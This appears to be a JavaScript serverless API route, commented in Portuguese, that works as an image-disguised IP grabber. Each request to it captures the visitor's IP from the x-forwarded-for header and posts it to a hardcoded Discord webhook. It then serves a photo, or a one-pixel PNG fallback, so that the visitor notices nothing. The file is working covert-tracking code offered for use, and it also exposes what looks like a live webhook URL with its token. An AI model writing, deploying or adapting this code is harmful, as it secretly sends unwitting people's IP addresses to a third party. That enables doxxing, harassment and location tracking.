import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  // 1. CAPTURA O IP
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 'IP não detectado';
  
  console.log('📸 IP capturado:', ip);
  console.log('📁 Foto usada: foto-discord2.png');
  
  // 2. DISCORD WEBHOOK
  const webhook = 'https://discord.com/api/webhooks/1456767774368993380/-412QnxkT_spPdRfKW2uuhMevQM23-v7XGR9yjOfz0ymAg7ooyJZ85kBILbzAEiaIZQ-';
  
  try {
    await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `📸 **foto** acessada!\n🌐 IP: ${ip}`
      })
    });
  } catch (e) {
    console.log('Erro Discord');
  }
  
  // 3. ENVIA foto-discord2.png (AQUI MUDA!)
  try {
    // CAMINHO DA FOTO NOVA
    const fotoPath = path.join(process.cwd(), 'public', 'foto-discord2.png');
    
    console.log('🔍 Procurando foto em:', fotoPath);
    
    // Verifica se existe
    if (!fs.existsSync(fotoPath)) {
      console.log('❌ foto não encontrada!');
      console.log('📁 Arquivos em public/:');
      
      // Lista o que tem na pasta public
      const publicDir = path.join(process.cwd(), 'public');
      const arquivos = fs.readdirSync(publicDir);
      console.log(arquivos);
    }
    
    const fotoBuffer = fs.readFileSync(fotoPath);
    
    // Envia a foto
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Cache-Control', 'no-cache');
    res.send(fotoBuffer);
    
    console.log('✅ foto enviada!');
    
  } catch (error) {
    console.log('❌ ERRO:', error.message);
    
    // Fallback: pixel vermelho
    const pixel = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
      'base64'
    );
    
    res.setHeader('Content-Type', 'image/png');
    res.send(pixel);
  }
}
